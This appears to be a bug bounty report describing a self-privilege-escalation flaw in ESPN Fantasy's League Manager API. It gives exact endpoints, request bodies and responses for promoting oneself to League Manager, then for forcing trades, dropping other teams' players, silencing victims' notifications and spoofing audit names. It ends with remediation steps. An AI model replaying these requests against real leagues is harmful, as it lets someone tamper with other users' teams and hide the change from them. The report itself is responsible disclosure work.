# Any ESPN Fantasy league member can grant themselves League Manager rights (privilege escalation → control of other teams)

**Program:** The Walt Disney Company (ESPN)
**Asset:** `fantasy.espn.com` / `lm-api-writes.fantasy.espn.com`
**Component:** Fantasy League Manager (LM) API — member update
**Severity:** High (7.1) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N`

---

## Summary

The member-update endpoint accepts the `isLeagueManager` field from the client and persists it without checking whether the caller already holds that privilege. Any ordinary league member can therefore promote themselves to League Manager with a single authenticated request.

Once promoted, the account can act on teams it does not own. Demonstrated: accepting a pending trade referencing another manager's `teamId`, which returns `200` and executes, where the same request from the same unprivileged account returns `401 AUTH_UNAUTHORIZED_FOR_TEAM`.

The endpoint *does* correctly block editing **other** members (`401 You are not authorized to edit this member`). The flaw is specifically that the privilege bit on your **own** record is client-writable.

## Affected endpoint

```
PUT https://lm-api-writes.fantasy.espn.com/apis/v3/games/{game}/seasons/{season}/segments/0/leagues/{leagueId}/members/{SWID}
Cookie: SWID=...; espn_s2=...
Content-Type: application/json
```

`{game}` observed as `fba` (Fantasy Basketball). The same API family serves `ffl` / `flb` / `fhl`; those were not tested.

## Steps to reproduce

Environment: two accounts I control, in a league I created. Account A is a normal member owning team 2. Account B owns team 1.

### 1. Confirm Account A is not a League Manager

```
GET .../leagues/{leagueId}?view=mMembers
```

```json
{"id": "{ACCOUNT_A_SWID}", "isLeagueManager": false}
```

### 2. Account A promotes itself

```
PUT .../leagues/{leagueId}/members/{ACCOUNT_A_SWID}
```

```json
{
  "id": "{ACCOUNT_A_SWID}",
  "displayName": "ESPNFAN...",
  "firstName": "...",
  "lastName": "...",
  "isLeagueManager": true,
  "notificationSettings": [ ... ]
}
```

**Expected:** `403` — only an existing League Manager may assign LM rights.
**Actual:** `200 OK`, and the record now reads:

```json
{"id": "{ACCOUNT_A_SWID}", "isLeagueManager": true}
```

Note this is a full replace (`PUT` semantics). Sending a minimal body also clears `notificationSettings`, which is worth fixing alongside the authz issue.

### 3. Use the escalated privilege against another team

There is a pending trade between team 1 (Account B) and team 2 (Account A). Account A accepts it, referencing **team 1 — a team it does not own**:

```
POST .../leagues/{leagueId}/transactions/
```

```json
{
  "type": "TRADE_ACCEPT",
  "teamId": 1,
  "memberId": "{ACCOUNT_A_SWID}",
  "scoringPeriodId": 2,
  "relatedTransactionId": "{TRADE_ID}",
  "isActingAsTeamOwner": true,
  "isLeagueManager": true,
  "skipTransactionCounters": false,
  "bidAmount": 0,
  "comment": "",
  "executionType": null
}
```

**Actual:**

```json
{"type":"TRADE_ACCEPT","isPending":false,"executionType":"EXECUTE",
 "relatedTransactionId":"{TRADE_ID}","memberId":"{ACCOUNT_A_SWID}", ...}
```

The trade is accepted and will process after the review window. Account B never acted.

### 4. Controls (same account, same endpoint, same session)

| # | Stored `isLeagueManager` | `isLeagueManager` in request body | `TRADE_ACCEPT` referencing team 1 |
|---|---|---|---|
| A | `false` | `true` | **401** `AUTH_UNAUTHORIZED_FOR_TEAM` |
| B | **`true`** (set via step 2) | **`false`** | **200** `executionType: EXECUTE` |
| C | `false` (reverted via step 2) | `true` | **401** `AUTH_UNAUTHORIZED_FOR_TEAM` |

Row B is decisive: the request body claimed **not** to be an LM and the action still succeeded, because the persisted flag was flipped. The body field is ignored — this is a stored-privilege change, not a client-supplied flag being trusted per-request.

### 5. Cross-member edit is correctly blocked

```
PUT .../leagues/{leagueId}/members/{OTHER_SWID}
-> 401 {"messages":["You are not authorized to edit this member."]}
```

So the defect is narrow and precise: self-escalation only.

## Impact

Any member of any ESPN Fantasy league can become League Manager of that league. League Manager authority over a league includes, per the product's own tooling (`lmAddPlayer`, `lmDropPlayers`, `lmEditLineup`, `lmManageIr`, `assignLMPowers`, `deleteTeams`, `deleteLeague`):

- Modifying any team's roster and lineup
- Accepting, vetoing or forcing transactions involving other managers
- Changing league settings (scoring, trade rules, waiver rules)
- Removing managers and teams
- Deleting the league

Demonstrated impact in this report is limited to the transaction case above; the remaining powers are inferred from the same privilege flag and the client's own LM tool list, and were not executed.

### Impact amplification: the veto safeguard can be disabled by the same escalated account

`tradeSettings.vetoVotesRequired` is LM-writable, and the product documents it as changeable at any time during the season. A value of `0` means **"LM Only Vetoes"** — the other managers can no longer vote to reject a trade. Combined with `assignLMPowers` on the same member endpoint, an attacker can:

1. promote themselves to League Manager,
2. set the veto policy to LM-only so a forced trade cannot be rejected by the league,
3. demote the other League Managers and/or clear their team-manager records so nobody can reverse it.

That turns a one-off privilege escalation into an irreversible outcome for the affected league, which is why this is reported as High rather than Medium.

### Impact amplification: other teams' rosters can be modified

With the flag set, the escalated account can also release players from teams it does not own. A drop is a `ROSTER` transaction whose item is typed `DROP`:

```
POST .../leagues/{id}/transactions/
{"type":"ROSTER","teamId":1,"memberId":"{attackerSwid}","scoringPeriodId":2,
 "isActingAsTeamOwner":true,"isLeagueManager":true,"skipTransactionCounters":false,
 "items":[{"playerId":4433134,"fromTeamId":1,"toTeamId":0,"type":"DROP"}]}
```

| caller | result |
|---|---|
| normal member | `401 You are not authorized to edit this team.` |
| escalated LM | `200`, `executionType: EXECUTE` — player moved to waivers, roster 13 → 12 |

Note the escalation is partial: `skipTransactionCounters: true` is rejected with `409 "Transaction counters can only be bypassed by the League Manager."` even when the stored flag is set, so that particular check uses a stricter determination. Team-edit authorization for transactions is not stricter.

### Impact amplification: other members' notification preferences can be silenced

`POST /leagues/{id}/members/{memberId}/notificationSettings/{settingId}` is correctly protected for ordinary members (`401 You are not authorized to edit this member`), but **an escalated LM can modify another member's notification settings**, and the change persists:

```
victim TEAM_TRADE_OFFER before: true
POST .../members/{victimSwid}/notificationSettings/{tradeOfferSettingId} as escalated LM
  body: {"enabled": false, "type": "TEAM_TRADE_OFFER", "forId": 1, "id": "..."}
-> 200
victim TEAM_TRADE_OFFER after: false
```

An attacker can therefore disable the `TEAM_TRADE_OFFER` (and other) notification channels of the manager whose team they intend to modify, then force the trade. The victim receives no notification of the change and only discovers it by browsing league activity.

Note for remediation: these settings can only be restored through the per-setting endpoint; the member-record `PUT` does not restore them (and clears the whole array if omitted, as noted above).

Notes on the remaining LM powers:

- The **creator's member record is not specially protected**: with the escalated flag set, `PUT /members/{creatorSwid}` returned `200` for both a `displayName` change and an `isLeagueManager` change, where a non-LM receives `401 You are not authorized to edit this member`.
- However, the creator's actual authority does not appear to be carried by that flag — in the test league the creator read `isLeagueManager: false` while still exercising LM powers (accepting trades on behalf of other teams). Flipping the flag on the creator's record therefore does not strip creator authority.
- Removal of the **creator** could not be achieved through any reachable path: the creator's `REMOVE MANAGER` control is hidden (un-hiding it and clicking issues no request at all), and `POST`/`PUT /teams/{teamId}` with `owners: []` returns `400 Invalid Input`. The creator therefore appears deliberately protected, though the exact removal endpoint was not captured, so server-side enforcement is inferred rather than proven.
- **The flag is the real privilege bit for the UI too:** with it set, the league page renders the `LM Tools` navigation entry for that account (absent when unset), confirming the escalated account receives the genuine League Manager interface rather than a partial API-only state.
- **The escalation is logged and visible to the league.** Privilege changes are recorded as league messages and appear in Recent Activity, attributed to the ESPN display name:

  ```
  Wed Oct 21 3:02 pm  League members updated. League rules updated
                      Assigned LM powers to ESPNFAN0000000000.   [View]
  Wed Oct 21 3:03 pm  Revoked LM powers from ESPNFAN0000000000.
  ```

  This corresponds to `messageType_127` (`"Assigned LM powers to {to}."`) and `messageType_129` (`"Revoked LM powers from {to}."`). Escalation and de-escalation are therefore both auditable by any league member, and there is no client-side capability to delete these entries.
- The members page itself renders the escalated member's row identically with the flag set and unset (no inline LM badge); the audit trail is in Recent Activity, not the member list.
- **The name in that audit trail is spoofable.** `displayName` is self-editable and **not unique**: setting one member's `displayName` to another member's exact value returned `200` and persisted, leaving two members with identical names in the same league. Because `messageType_127`/`129` render `Assigned LM powers to {to}` / `Revoked LM powers from {to}`, a member can change their display name to a target's name before escalating, and the resulting activity entry carries the target's name. The privilege bit and the identity label for the audit entry are therefore both attacker-controlled.

Integrity impact is on other users' fantasy teams within a league the attacker is already a member of. There is no cross-tenant data exposure, no PII, and no account takeover.

## Suggested remediation

1. Do not accept `isLeagueManager` (or any privilege field) from a member self-update request. Whitelist mutable fields (`displayName`, `notificationSettings`, etc.) and ignore the rest server-side.
2. Require that the caller is currently a League Manager before any change to `isLeagueManager` on any member record, and audit those changes.
3. Derive privileges from the server-side membership record only — never echo a client-supplied privilege value back into storage.
4. Switch member updates from full `PUT` replace to partial semantics so unrelated fields (`notificationSettings`) are not destructively overwritten.

## Notes

- Testing was performed entirely with accounts I own, in a league I created. No other user's account or team was modified in the course of producing this report.
- The `TRADE_ACCEPT` authorization logic is otherwise correct for non-LM accounts: a non-LM proposer cannot accept its own trade, and a non-party cannot accept a trade between two other teams. The behavior in step 3 is a direct consequence of the privilege escalation, not an independent trade-authorization bug.

## Appendix: separate low-impact observation

`POST /leagues/{id}/invites/{inviteId}?memberId={SWID}` seats the invite using the `memberId` **query parameter** rather than the authenticated session. Sending it as account A with `memberId={REDACTED_SWID}` returned `201` and created a league member with that exact ID, assigned to an open team. Impact is low (a valid invite token is still required, and the league-full check applies), and this may be intended behavior. Reported for completeness only.
